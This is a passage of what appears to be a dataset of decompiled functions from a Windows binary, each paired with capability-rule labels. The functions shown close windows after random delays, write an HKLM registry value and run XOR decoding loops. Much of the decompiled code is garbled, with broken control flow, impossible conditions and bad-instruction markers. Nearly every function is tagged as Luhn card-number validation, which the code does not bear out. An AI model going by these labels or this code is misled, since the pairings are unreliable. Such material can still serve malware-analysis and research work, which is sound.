&hWnd);\n                    if ((iVar5 < 0) || (hWnd == NULL)) {\n                        var_4h._0_1_ = 3;\n                        if (var_10h != NULL) {\n                            (**(*var_10h + 8))(var_10h);\n                        }\njoined_r0x004034a8:\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\ncode_r0x004034b4:\n                        (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                        break;\n                    }\n                    iVar5 = (***hWnd)(hWnd, 0x4061b0, &var_10h);\n                    if (((iVar5 < 0) || (var_10h == NULL)) ||\n                       (iVar5 = (**(*var_10h + 0x38))(var_10h, &pbstr),  iVar5 < 0)) {\njoined_r0x0040346f:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                        goto code_r0x004034b4;\n                    }\n                    if (pbstr == 0) {\njoined_r0x004032ab:\n                        if (var_10h != NULL) {\n                            var_4h._0_1_ = 3;\n                            (**(*var_10h + 8))(var_10h);\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    else {\n                        fcn.00402e80(pbstr, &var_24ch, 0x104);\n                        (*_sym.imp.OLEAUT32.dll_SysStringLen)(pbstr);\n                        iVar6 = (*_sym.imp.MSVCRT.dll__stricmp)(&var_24ch, 0x4115ac);\n                        if (iVar6 != 0) goto joined_r0x004032ab;\n                        var_14h = NULL;\n                        var_4h._0_1_ = 5;\n                        iVar5 = (***hWnd)(hWnd, 0x4061a0, &var_14h);\n                        if ((iVar5 < 0) || (var_14h == NULL)) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\njoined_r0x00403454:\n                            if (var_10h != NULL) {\n                                var_4h._0_1_ = 3;\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                            goto joined_r0x004034a8;\n                        }\n                        iVar5 = (**(*var_14h + 0x20))(var_14h, &var_3ch);\n                        iVar6 = var_3ch;\n                        if (iVar5 < 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            goto joined_r0x00403454;\n                        }\n                        if (var_3ch == 0) {\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        else {\n                            var_148h = 0;\n                            puVar9 = &var_147h;\n                            for (iVar7 = 0x40; iVar7 != 0; iVar7 = iVar7 + -1) {\n                                *puVar9 = 0;\n                                puVar9 = puVar9 + 1;\n                            }\n                            *puVar9 = 0;\n                            *(puVar9 + 2) = 0;\n                            fcn.00402e80(iVar6, &var_148h, 0x104);\n                            (*_sym.imp.OLEAUT32.dll_SysStringLen)(var_3ch);\n                            iVar6 = fcn.00402fa0(&var_148h);\n                            if (iVar6 == 0) {\n                                (*_sym.imp.KERNEL32.dll_Sleep)(10);\n                                (**(*var_10h + 0x114))(var_10h);\n                                var_4h._0_1_ = 4;\n                                if (var_14h != NULL) {\n                                    (**(*var_14h + 8))(var_14h);\n                                }\n                                goto joined_r0x0040346f;\n                            }\n                            (*_sym.imp.KERNEL32.dll_Sleep)(0);\n                            var_4h._0_1_ = 4;\n                            if (var_14h != NULL) {\n                                (**(*var_14h + 8))(var_14h);\n                            }\n                            var_4h._0_1_ = 3;\n                            if (var_10h != NULL) {\n                                (**(*var_10h + 8))(var_10h);\n                            }\n                        }\n                        var_4h._0_1_ = 2;\n                        if (hWnd != NULL) {\n                            var_4h._0_1_ = 2;\n                            (**(*hWnd + 8))(hWnd);\n                        }\n                    }\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_34h);\n                    var_40h = var_40h + 1;\n                } while (var_40h < var_1ch);\n            }\n            var_4h = var_4h._1_3_ << 8;\n            if (var_24h != NULL) {\n                (**(*var_24h + 8))(var_24h);\n            }\n            var_4h = 0xffffffff;\n            puVar2 = var_44h;\n            if (var_20h != NULL) {\n                (**(*var_20h + 8))(var_20h);\n                puVar2 = var_44h;\n            }\n        }\n    }\n    (*_sym.imp.KERNEL32.dll_FreeLibrary)(puVar2);\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    *in_FS_OFFSET = var_ch;\n    return iVar5;\n}\n",
        "token_count": 2611
    },
    "004035d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004035f6) overlaps instruction at (ram,0x004035f3)\n// \n\nuint __cdecl fcn.004035d0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint unaff_ESI;\n    int32_t unaff_EDI;\n    uint *puVar4;\n    uchar var_108h;\n    uint var_107h;\n    int32_t iStack260;\n    char cStack252;\n    uint var_4h;\n    \n    puVar3 = &stack0xfffffffc;\n    if ((0x107 < &stack0xfffffffc && *0x10 != 0x10c) &&\n       (puVar3 = &stack0xfffffffc,  0x107 >= &stack0xfffffffc || *0x10 == 0x10c)) {\n        piVar1 = unaff_EDI + -0x75;\n        *piVar1 = *piVar1 - &stack0xfffffeec;\n        puVar3 = &stack0xfffffffc;\n        arg_8h = unaff_ESI;\n        if (*piVar1 != 0) {\n            *(iStack260 + 0x458b0c4d) = *(iStack260 + 0x458b0c4d) + cStack252;\n            puVar3 = _var_108h;\n        }\n    }\n    (*_sym.imp.USER32.dll_GetWindowThreadProcessId)();\n    if (*(puVar3 + 0xc) != *(puVar3 + -4)) {\n        return 1;\n    }\n    puVar3[-0x108] = 0;\n    puVar4 = puVar3 + -0x107;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    *puVar4 = 0;\n    *(puVar4 + 2) = 0;\n    (*_sym.imp.USER32.dll_GetClassNameA)();\n    iVar2 = (*_sym.imp.MSVCRT.dll__stricmp)();\n    if (iVar2 == 0) {\n        (*_sym.imp.USER32.dll_EnumChildWindows)();\n        iVar2 = (*_sym.imp.MSVCRT.dll_rand)();\n        (*_sym.imp.KERNEL32.dll_Sleep)((iVar2 % 10 + 4) * 1000);\n        (*_sym.imp.USER32.dll_PostMessageA)(arg_8h, 0x10, 0, 0);\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 599
    },
    "00403b60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403b60(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            in_EAX = iVar1 / 0x1a;\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return in_EAX;\n}\n",
        "token_count": 158
    },
    "00403d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403dab) overlaps instruction at (ram,0x00403da7)\n// \n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00403d10(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar3;\n    int32_t in_EDX;\n    int32_t *piVar4;\n    uint8_t uVar5;\n    int32_t unaff_EBX;\n    uint32_t uVar6;\n    bool bVar7;\n    unkbyte10 in_ST0;\n    unkbyte10 in_ST1;\n    unkbyte10 in_ST2;\n    unkbyte10 in_ST3;\n    unkbyte10 in_ST4;\n    unkbyte10 in_ST5;\n    unkbyte10 in_ST6;\n    unkbyte10 in_ST7;\n    uint var_1h;\n    uint32_t uVar2;\n    \n    iVar3 = 0;\n    if (0 < arg_14h) {\n        uVar6 = 1;\n        uVar2 = arg_14h;\n        do {\n            bVar7 = ((unaff_EBX ^ 0x70c5) - uVar2 >> 8 | iVar3 >> 8) < iVar3;\n            if ((bVar7) || (uVar2 = arg_10h,  !bVar7)) {\n                in_EDX = uVar6 >> 0x1f;\n                uVar2 = uVar6;\n            }\n            uVar6 = uVar6 ^ *(uVar6 + 0xe58be73);\n            uVar1 = *(CONCAT44(in_EDX, uVar2) % arg_ch + arg_8h);\n            piVar4 = (uVar6 - 1) % arg_ch;\n            uVar5 = *(piVar4 + arg_8h) ^ 0x72;\n            if ((-1 < uVar5) && (-1 >= uVar5)) {\n                *(arg_8h + -0x7ce92414) = in_ST0;\n                *piVar4 = *piVar4 + 0x6650df84;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n            *(arg_18h + -1 + uVar6) = arg_14h * '\\x02' ^ uVar5;\n            in_EDX = CONCAT31(piVar4 >> 8 & 0xffff00 | piVar4 >> 8, uVar1);\n            uVar1 = arg_14h * 2 ^ uVar1;\n            uVar2 = arg_14h * 2 & 0xffffff00 | uVar1;\n            iVar3 = iVar3 + 1;\n            *(uVar6 + arg_18h) = uVar1;\n            uVar6 = uVar6 + 2;\n            unaff_EBX = arg_18h;\n        } while (iVar3 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 738
    },
    "00403e00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "set registry value"
        ],
        "decompiled_code": "\nbool fcn.00403e00(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00402cf0(&var_4h);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x411358, 0x411398, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 246
    },
    "00403f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f9b) overlaps instruction at (ram,0x00403f9a)\n// \n// WARNING: Removing unreachable block (ram,0x00403f9b)\n\nvoid __cdecl fcn.00403f50(uint32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t *arg_14h)\n\n{\n    uint32_t in_EAX;\n    uint32_t *puVar1;\n    uint8_t uVar2;\n    uint32_t unaff_EBX;\n    uint32_t *puVar3;\n    bool bVar4;\n    uint8_t in_AF;\n    bool bVar5;\n    bool bVar6;\n    bool bVar7;\n    \n    puVar1 = NULL;\n    bVar4 = false;\n    bVar7 = false;\n    bVar5 = arg_14h == NULL;\n    puVar3 = arg_14h;\n    if (!bVar5) {\n        do {\n            bVar6 = puVar3 < 0;\n            if ((!bVar5) && (bVar5)) {\n                unaff_EBX = unaff_EBX + 1;\n                if (bVar4 || unaff_EBX == 0) {\n                    return;\n                }\n                in_AF = 9 < (in_EAX & 0xf) | in_AF;\n                in_EAX = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + in_AF, in_EAX + in_AF * '\\x06') & 0xff0f;\n                *(in_EAX + 0x2a) = *(in_EAX + 0x2a) - unaff_EBX;\n                bVar7 = SCARRY4(arg_10h, 1);\n                arg_10h = arg_10h + 1;\n                bVar6 = arg_10h < 0;\n            }\n            uVar2 = *(puVar1 + arg_10h);\n            puVar3 = arg_14h;\n            if ((bVar7 == bVar6) && (bVar7 != bVar6)) {\n                out(0xc4, in_EAX);\n                puVar3 = arg_14h + 1;\n                *arg_14h = in_EAX;\n            }\n            uVar2 = uVar2 ^ *(puVar1 % arg_ch + arg_8h);\n            unaff_EBX = unaff_EBX & 0xffffff00 | uVar2;\n            *(puVar1 + arg_10h) = uVar2;\n            puVar1 = puVar1 + 1;\n            bVar4 = puVar1 < puVar3;\n            bVar7 = SBORROW4(puVar1, puVar3);\n            bVar5 = puVar1 - puVar3 == NULL;\n            in_EAX = arg_8h;\n            arg_14h = puVar3;\n            puVar3 = puVar1 - puVar3;\n        } while (bVar4);\n    }\n    return;\n}\n",
        "token_count": 671
    },
    "00404160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open file",
            "contain loop",
            "write file on Windows"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041ba) overlaps instruction at (ram,0x004041b6)\n// \n\nuint __cdecl fcn.00404160(uint filename, uint stream, uint ptr, uint nitems)\n\n{\n    uint32_t uVar1;\n    int32_t extraout_ECX;\n    int32_t *unaff_EDI;\n    uchar uVar2;\n    char cVar3;\n    \n    uVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, stream);\n    if (uVar1 == 0) {\n        return 0;\n    }\n    uVar2 = 0;\n    cVar3 = (uVar1 & (uVar1 & 0xffff0000 | CONCAT11((uVar1 >> 8) + '\\x01', uVar1))) == 0;\n    do {\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, uVar1);\n        if ((uVar2) || (!uVar2)) break;\n    } while (extraout_ECX != 1 && cVar3 != '\\0');\n    *unaff_EDI = uVar1 + 4;\n    (*_sym.imp.MSVCRT.dll_fflush)();\n    (*_sym.imp.MSVCRT.dll_fclose)();\n    return 1;\n}\n",
        "token_count": 292
    },
    "00404810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404a68) overlaps instruction at (ram,0x00404a67)\n// \n// WARNING: Removing unreachable block (ram,0x00404a68)\n\nvoid __fastcall fcn.00404810(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    uint32_t extraout_ECX;\n    char extraout_CH;\n    uint extraout_ECX_00;\n    ushort extraout_DX;\n    uint32_t extraout_EDX;\n    uint unaff_EBX;\n    uint *unaff_ESI;\n    uint *puVar4;\n    uint *unaff_EDI;\n    bool bVar5;\n    char cVar6;\n    ulong uVar7;\n    uint uVar8;\n    ushort uVar9;\n    ushort uVar10;\n    ushort uVar11;\n    uint16_t uVar12;\n    ushort uVar13;\n    \n    while( true ) {\n        uVar12 = unaff_EBX;\n        bVar5 = (uVar12 & 0xff00 | unaff_EBX - 0x12) < param_2;\n        uVar10 = unaff_EBX >> 0x10;\n        uVar7 = fcn.004038e0(0x423614, 0xd, 0x411190, 0x11);\n        param_2 = uVar7 >> 0x20;\n        if ((bVar5) || (!bVar5)) break;\n        if (&stack0xffffffe4 < *uVar7 || uVar7 == 0xffffffff) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    cVar1 = fcn.004038e0(0x423614, 0xd, 0x4113ac, 0xf);\n    uVar3 = (extraout_ECX ^ 0x6dd) + 1;\n    bVar5 = (extraout_ECX & 0xffff0000 | uVar3 & 0xff | (uVar3 >> 8) + cVar1 << 8) == extraout_EDX;\n    fcn.004038e0(0x423614, 0xd, 0x4113bc, 0x1a);\n    puVar4 = unaff_ESI;\n    if ((!bVar5) && (bVar5)) {\n        puVar4 = unaff_ESI + 1;\n        out(*unaff_ESI, extraout_DX);\n    }\n    uVar9 = 0x1410;\n    uVar11 = 0x41;\n    uVar8 = 0xd;\n    fcn.004038e0(0x423614, 0xd, 0x411410, 10);\n    cVar6 = '\\x01';\n    cVar1 = '\\x01';\n    iVar2 = fcn.004038e0(0x423614, 0xd, 0x41141c, 0xb);\n    if ((cVar6 != cVar1) || (cVar6 == cVar1)) {\n        uVar12 = 8;\n        uVar10 = 0;\n        uVar9 = 0x1428;\n        uVar11 = 0x41;\n        uVar8 = 0xd;\n    }\n    *(iVar2 + 0xd) = *(iVar2 + 0xd) + extraout_CH;\n    fcn.004038e0(0x423614, uVar8, CONCAT22(uVar11, uVar9), CONCAT22(uVar10, uVar12));\n    fcn.004038e0(0x423614, 0xd, 0x411430, 9);\n    fcn.004038e0(0x423614, 0xd, 0x41143c, 9);\n    uVar10 = 0x1448;\n    uVar9 = 0x41;\n    uVar8 = 0xd;\n    fcn.004038e0(0x423614, 0xd, 0x411448, 9);\n    bVar5 = false;\n    fcn.004038e0(0x423614, 0xd, 0x411454, 0xc);\n    if (!bVar5) {\n        uVar11 = extraout_ECX_00;\n        uVar13 = extraout_ECX_00 >> 0x10;\n        if (bVar5) goto code_r0x004049e4;\n    }\n    uVar11 = 3;\n    uVar13 = 0;\n    uVar10 = 0x1460;\n    uVar9 = 0x41;\n    uVar8 = 0xd;\ncode_r0x004049e4:\n    *unaff_EDI = *puVar4;\n    *0x60680377 = *0x60680377 + (extraout_ECX_00 >> 8);\n    fcn.004038e0(0x423614, uVar8, CONCAT22(uVar9, uVar10), CONCAT22(uVar13, uVar11));\n    fcn.004038e0(0x423614, 0xd, 0x411464, 10);\n    cVar6 = '\\0';\n    cVar1 = '\\0';\n    uVar8 = fcn.004038e0(0x423614, 0xd, 0x411470, 0x40);\n    if ((cVar6 == cVar1) && (cVar6 != cVar1)) {\n        out(0xc4, uVar8);\n        unaff_EDI[1] = uVar8;\n    }\n    fcn.004038e0(0x423614, 0xd, 0x4114b0, 0xc);\n    fcn.004038e0(0x423614, 0xd, 0x4114bc, 0xb);\n    fcn.004038e0(0x423614, 0xd, 0x4114c8, 4);\n    fcn.004038e0(0x423614, 0xd, 0x4114cc, 4);\n    fcn.004038e0(0x423614, 0xd, 0x4114d0, 0xc);\n    fcn.004038e0(0x423614, 0xd, 0x4114dc, 4);\n    fcn.004038e0(0x423614, 0xd, 0x4114e0, 9);\n    fcn.004038e0(0x423614, 0xd, 0x4114ec, 0x16);\n    fcn.004038e0(0x423614, 0xd, 0x411504, 7);\n    return;\n}\n",
        "token_count": 1536
    },
    "00404be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404c0b) overlaps instruction at (ram,0x00404c0a)\n// \n// WARNING: Unable to track spacebase fully for stack\n\nvoid __fastcall fcn.00404be0(uchar *param_1, ushort param_2)\n\n{\n    uint8_t *puVar1;\n    unkbyte6 *in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    char extraout_CH;\n    int32_t extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    int32_t extraout_ECX_04;\n    int32_t extraout_EDX;\n    uint32_t extraout_EDX_00;\n    uint extraout_EDX_01;\n    char *pcVar5;\n    uint32_t unaff_EBX;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uchar *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *unaff_EBP;\n    int32_t unaff_ESI;\n    uchar *unaff_EDI;\n    uchar *puVar12;\n    int32_t iVar13;\n    ushort in_SS;\n    uint8_t in_CF;\n    uchar uVar14;\n    uint8_t uVar15;\n    bool bVar16;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar17;\n    char cVar18;\n    bool in_OF;\n    uchar uVar19;\n    char cVar20;\n    ulong uVar21;\n    unkbyte6 Var22;\n    uint in_stack_ffffffec;\n    uint in_stack_fffffff0;\n    ushort in_stack_fffffff4;\n    \n    if ((in_OF) || (uVar4 = CONCAT22(param_2, in_stack_fffffff4),  !in_OF)) {\n        uVar4 = 0x20;\n        in_stack_fffffff0 = 0x41150c;\n        in_stack_ffffffec = 0xd;\ncode_r0x00404bfb:\n        while( true ) {\n            unaff_EBX = unaff_EBX & 0xffff0000 | CONCAT11(*param_1, unaff_EBX);\n            uVar3 = in_CF;\n            uVar14 = 0xe62ddf54 < uVar3;\n            uVar19 = SCARRY4(uVar3, 0x19d220ab) != false;\n            bVar17 = uVar3 == 0xe62ddf55;\n            fcn.004038e0(0x423614, 0x56, in_stack_ffffffec, in_stack_fffffff0);\n            puVar8 = unaff_EBP;\n            if ((!bVar17) && (bVar17)) {\n                puVar6 = &stack0xffffffe0;\n                puVar8 = &stack0xffffffe0;\n                cVar18 = '\\x10';\n                do {\n                    unaff_EBP = unaff_EBP + -1;\n                    puVar6 = puVar6 + -1;\n                    *puVar6 = *unaff_EBP;\n                    cVar18 = cVar18 + -1;\n                } while ('\\0' < cVar18);\n            }\n            in_stack_ffffffec = 0x423614;\n            fcn.004038e0(0x423614, 0xd, 0x41152c, 0x26);\n            puVar12 = unaff_EDI;\n            if ((uVar14 || bVar17) || (!uVar14 && !bVar17)) break;\n            if (!uVar19) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            param_1 = extraout_ECX + 1;\n            puVar1 = extraout_EDX + 0xd;\n            uVar15 = param_1 >> 8;\n            in_CF = CARRY1(*puVar1, uVar15);\n            *puVar1 = *puVar1 + uVar15;\n            unaff_EBP = puVar8;\n        }\n    }\n    else {\n        puVar12 = unaff_EDI + 1;\n        uVar14 = in(param_2);\n        *unaff_EDI = uVar14;\n        unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n        unaff_EDI = puVar12;\n        if (in_CF || in_ZF) goto code_r0x00404bfb;\n        unaff_ESI = *in_EAX;\n    }\n    iVar2 = fcn.004038e0(0x423614, 0xd, 0x411554, 8);\n    cVar20 = SBORROW4(iVar2, 0x6e32);\n    cVar18 = iVar2 + -0x6e32 < 0;\n    fcn.004038e0(0x423614, 0xd, 0x41155c, 0x19);\n    if ((cVar20 != cVar18) || (uVar3 = unaff_EBX,  cVar20 == cVar18)) {\n        uVar3 = 0xb;\n        uVar4 = 0x411578;\n        in_stack_fffffff0 = 0xd;\n    }\n    cVar20 = SCARRY4(extraout_EDX_00, 0xd6a0041) != SCARRY4(extraout_EDX_00 + 0xd6a0041, extraout_EDX_00 < 0x78680b6a);\n    cVar18 = extraout_EDX_00 + 0xd6a0041 + (extraout_EDX_00 < 0x78680b6a) < 0;\n    uVar3 = fcn.004038e0(0x423614, in_stack_fffffff0, uVar4, uVar3);\n    if ((cVar20 != cVar18) || (uVar15 = (extraout_ECX_00 << 0x10) >> 0x18,  cVar20 == cVar18)) {\n        uVar15 = extraout_ECX_00 >> 8;\n    }\n    puVar7 = &stack0xffffffe0 ^ *(unaff_EBX + 0x6a);\n    bVar17 = SCARRY4(unaff_ESI, 0xd6a0041) != SCARRY4(unaff_ESI + 0xd6a0041, CARRY1(uVar15, *(unaff_ESI + -0x7c)));\n    puVar7[-1] = 0x423614;\n    puVar7[-2] = 0x404cee;\n    fcn.004038e0(puVar7[-1], *puVar7, puVar7[1], puVar7[2]);\n    puVar8 = puVar7 + -1;\n    if ((!bVar17) && (puVar7[-2] = extraout_EDX_01,  puVar8 = puVar7 + -1,  bVar17)) {\n        *puVar7[-1] = puVar7[6];\n        return;\n    }\n    do {\n        *(puVar8 + -4) = 0x12;\n        *(puVar8 + -8) = 0x411598;\n        *(puVar8 + -0xc) = 0xd;\n        *(puVar8 + -0x10) = 0x423614;\n        *(puVar8 + -0x14) = 0x404d21;\n        Var22 = fcn.004038e0(*(puVar8 + -0x10), *(puVar8 + -0xc), *(puVar8 + -8), *(puVar8 + -4));\n        *(puVar8 + 0x2e) = Var22 >> 0x20;\n        *(puVar8 + 0x2a) = Var22;\n        *(puVar8 + 0x2c) = 2;\n        *(puVar8 + 0x28) = 0x4115ac;\n        *(puVar8 + 0x24) = 0xd;\n        *(puVar8 + 0x20) = 0x423614;\n        *(puVar8 + 0x1c) = 0x404d4c;\n        fcn.004038e0(*(puVar8 + 0x20), *(puVar8 + 0x24), *(puVar8 + 0x28), *(puVar8 + 0x2c));\n        *(puVar8 + 0x2c) = extraout_ECX_01;\n        *(puVar8 + 0x2c) = 8;\n        *(puVar8 + 0x28) = 0x4115b0;\n        *(puVar8 + 0x24) = 0xd;\n        *(puVar8 + 0x20) = 0x423614;\n        *(puVar8 + 0x1c) = 0x404d6d;\n        uVar4 = fcn.004038e0(*(puVar8 + 0x20), *(puVar8 + 0x24), *(puVar8 + 0x28), *(puVar8 + 0x2c));\n        *(puVar8 + 0x2c) = uVar4;\n        *(puVar8 + 0x2c) = 8;\n        *(puVar8 + 0x28) = 0x4115b8;\n        *(puVar8 + 0x24) = 0xd;\n        *(puVar8 + 0x20) = 0x423614;\n        *(puVar8 + 0x1c) = 0x404d8e;\n        uVar4 = fcn.004038e0(*(puVar8 + 0x20), *(puVar8 + 0x24), *(puVar8 + 0x28), *(puVar8 + 0x2c));\n        *(puVar8 + 0x2c) = uVar4;\n        *(puVar8 + 0x28) = extraout_ECX_02;\n        *(puVar8 + 0x2c) = 6;\n        *(puVar8 + 0x28) = 0x4115c0;\n        *(puVar8 + 0x24) = 0xd;\n        *(puVar8 + 0x20) = 0x423614;\n        *(puVar8 + 0x1c) = 0x404db9;\n        uVar4 = fcn.004038e0(*(puVar8 + 0x20), *(puVar8 + 0x24), *(puVar8 + 0x28), *(puVar8 + 0x2c));\n        *(puVar8 + 0x2c) = uVar4;\n        *(puVar8 + 0x28) = extraout_ECX_03;\n        bVar17 = false;\n        bVar16 = (POPCOUNT((uVar4 + 1) - 1 & 0x7b) & 1U) == 0;\n        *(puVar8 + 0x2c) = 7;\n        *(puVar8 + 0x28) = 0x4115c8;\n        *(puVar8 + 0x24) = 0xd;\n        *(puVar8 + 0x20) = 0x423614;\n        *(puVar8 + 0x1c) = 0x404de9;\n        uVar4 = fcn.004038e0(*(puVar8 + 0x20), *(puVar8 + 0x24), *(puVar8 + 0x28), *(puVar8 + 0x2c));\n        puVar9 = puVar8 + 0x20;\n        if ((bVar16) || (*(puVar8 + 0x1c) = uVar4,  puVar9 = puVar8 + 0x20,  !bVar16)) goto code_r0x00404e0d;\n        segment(in_SS, puVar8 + 0x20);\n        puVar8 = puVar8 + 0x20 & 0xffff0000 | puVar8 + 0x24;\n        if (bVar17) {\n            *0xb7bc9eb2 = *0xb7bc9eb2 + extraout_CH;\n            goto code_r0x00404e31;\n        }\n    } while (bVar16);\n    puVar9 = (puVar8 ^ uVar3) - 4;\n    *((puVar8 ^ uVar3) - 4) = 0xb7bc9ea5;\ncode_r0x00404e0d:\n    *(puVar9 + -4) = 7;\n    *(puVar9 + -8) = 0x4115d0;\n    *(puVar9 + -0xc) = 0xd;\n    *(puVar9 + -0x10) = 0x423614;\n    *(puVar9 + -0x14) = 0x404e20;\n    uVar4 = fcn.004038e0(*(puVar9 + -0x10), *(puVar9 + -0xc), *(puVar9 + -8), *(puVar9 + -4));\n    *(puVar9 + 0xc) = uVar4;\n    *(puVar9 + 0xc) = 6;\n    *(puVar9 + 8) = 0x4115d8;\n    puVar8 = puVar9 + 4;\n    *(puVar9 + 4) = 0xd;\ncode_r0x00404e31:\n    puVar8[-1] = 0x423614;\n    puVar8[-2] = 0x404e3b;\n    uVar4 = fcn.004038e0(puVar8[-1], *puVar8, puVar8[1], puVar8[2]);\n    puVar8[2] = uVar4;\n    puVar8[1] = puVar12;\n    uVar15 = 0;\n    bVar17 = (POPCOUNT(puVar12 & 0xff) & 1U) == 0;\n    iVar13 = puVar8[1];\n    puVar8[2] = 0x25;\n    puVar8[1] = 0x4115e0;\n    *puVar8 = 0xd;\n    puVar10 = puVar8 + -1;\n    puVar8[-1] = 0x423614;\n    puVar8[-2] = 0x404e72;\n    uVar21 = fcn.004038e0(puVar8[-1], *puVar8, puVar8[1], puVar8[2]);\n    pcVar5 = uVar21 >> 0x20;\n    iVar2 = uVar21;\n    if (!bVar17) {\n        *(puVar8 + -6) = uVar3;\n        if (bVar17) {\n            out(*(uVar3 & 0xffff0000 | *(puVar8 + -6)), uVar21 >> 0x20);\n            uVar15 = in_AF;\n            do {\n                cVar18 = iVar2 >> 8;\n                uVar15 = 9 < (iVar2 & 0xf) | uVar15;\n                puVar11 = *puVar10 + 4;\n                puVar10 = *puVar10 + 4;\n                iVar2 = CONCAT31(CONCAT21(iVar2 >> 0x10, cVar18 - uVar15), -uVar15);\n            } while (uVar15 || cVar18 == *pcVar5);\n            goto code_r0x00404e83;\n        }\n    }\n    puVar8[-2] = 8;\n    puVar8[-3] = 0x411608;\n    puVar11 = puVar8 + -4;\n    puVar8[-4] = 0xd;\ncode_r0x00404e83:\n    *(iVar13 + pcVar5 * 2) = (*(iVar13 + pcVar5 * 2) + 0x7b) - uVar15;\n    *(extraout_ECX_04 + 0x6a) = iVar2;\n    *(iVar2 + 8) = *(iVar2 + 8) | extraout_ECX_04 >> 8;\n 